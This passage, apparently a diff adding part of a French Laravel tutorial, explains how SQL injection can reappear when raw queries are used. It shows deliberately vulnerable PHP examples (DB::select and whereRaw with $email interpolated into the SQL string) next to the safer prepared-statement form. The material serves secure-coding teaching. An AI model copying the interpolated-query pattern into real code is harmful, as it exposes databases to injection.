+👉 Protégé contre l’injection SQL.</p>
+<h3 id="52-alors-injection-impossible">5.2 Alors, injection impossible ?<a class="headerlink" href="#52-alors-injection-impossible" title="Permanent link">⚓︎</a></h3>
+<p>👉 Pas totalement. Laravel protège bien si on utilise correctement Eloquent ou Query Builder.</p>
+<p>Mais on peut réintroduire une faille si :</p>
+<p>a) <strong>On Utilise des requêtes brutes</strong> (raw queries)
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><span class="nx">DB</span><span class="o">::</span><span class="na">select</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users WHERE email = &#39;</span><span class="si">$email</span><span class="s2">&#39;&quot;</span><span class="p">);</span>
+</code></pre></div>
+➡️ Ici, on retombe exactement dans la vulnérabilité classique.</p>
+<p>Laravel propose une variante plus sûre :
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><span class="nx">DB</span><span class="o">::</span><span class="na">select</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users WHERE email = ?&quot;</span><span class="p">,</span> <span class="p">[</span><span class="nv">$email</span><span class="p">]);</span>
+</code></pre></div>
+👉 Ici, c’est une requête préparée. 👏👏👏</p>
+<p>b) <strong>Mauvaise utilisation de fonctions “raw”</strong></p>
+<p>Certaines méthodes permettent d’injecter du SQL “pur” :
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><span class="nx">DB</span><span class="o">::</span><span class="na">table</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">)</span>
+  <span class="o">-&gt;</span><span class="na">whereRaw</span><span class="p">(</span><span class="s2">&quot;email = &#39;</span><span class="si">$email</span><span class="s2">&#39;&quot;</span><span class="p">)</span>
+  <span class="o">-&gt;</span><span class="na">get</span><span class="p">();</span>
+</code></pre></div>
+👉 Si <code class="language-text highlight">$email</code> vient d’un formulaire utilisateur non filtré, c’est vulnérable.</p>
+<div class="admonition warning">
+<p class="admonition-title">Et le developpeur ...</p>
+<p>Laravel protège par défaut contre l’injection SQL (via ORM et requêtes préparées).</p>
+<p>Mais la faille réapparaît si le développeur contourne le framework avec des requêtes brutes ou des <code class="language-text highlight">whereRaw()</code> mal utilisés.</p>
+<p>👉 Le problème reste <strong>humain</strong>, pas technique : le framework fournit les outils, mais c’est au développeur de les utiliser correctement.</p>
+</div>
 
 
 
